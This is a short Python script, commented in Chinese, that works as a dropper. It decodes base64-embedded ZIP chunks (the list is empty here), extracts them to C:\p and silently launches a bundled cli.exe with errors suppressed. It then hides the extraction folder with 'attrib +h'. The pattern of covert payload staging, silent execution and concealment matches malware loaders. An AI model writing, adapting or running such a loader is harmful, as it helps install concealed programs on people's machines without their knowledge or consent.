import os
import zipfile
import tempfile
import base64
import subprocess

EMBEDDED_ZIP_CHUNKS = [  
    
 ]


def extract_embedded_zip():
    # 合并并解码Base64数据
    zip_data = base64.b64decode(''.join(EMBEDDED_ZIP_CHUNKS))

    # 写入临时ZIP文件
    with tempfile.NamedTemporaryFile(delete=False, suffix=".zip") as temp_zip:
        temp_zip.write(zip_data)
        temp_zip_path = temp_zip.name
    
    # 创建目标目录（如果不存在）
    extract_dir = r'C:\p'
    os.makedirs(extract_dir, exist_ok=True)

    # 解压ZIP文件
    with zipfile.ZipFile(temp_zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_dir) 

    # 清理临时文件
    os.unlink(temp_zip_path)
    return extract_dir
def run_extracted_program(extract_dir):
    # 遍历解压目录寻找可执行文件
    for root, dirs, files in os.walk(extract_dir):
        for file in files:
           # 检查客户端
            if file.lower() == 'cli.exe':
                exe_path = os.path.join(root, file)
                try:
                    # 启动程序（不等待其结束）
                    subprocess.Popen([exe_path], cwd=root)
                    return
                except:
                    return
                    # 如果没有找到可执行文件，静默返回

def hide_directory(dir_path):
    #隐藏目录
    try:
        subprocess.run(f'attrib +h "{dir_path}"', shell=True, check=True)
    except subprocess.CalledProcessError as e:
        return

if __name__ == "__main__":
    extraction_path = extract_embedded_zip()
    run_extracted_program(extraction_path)
    hide_directory(extraction_path) 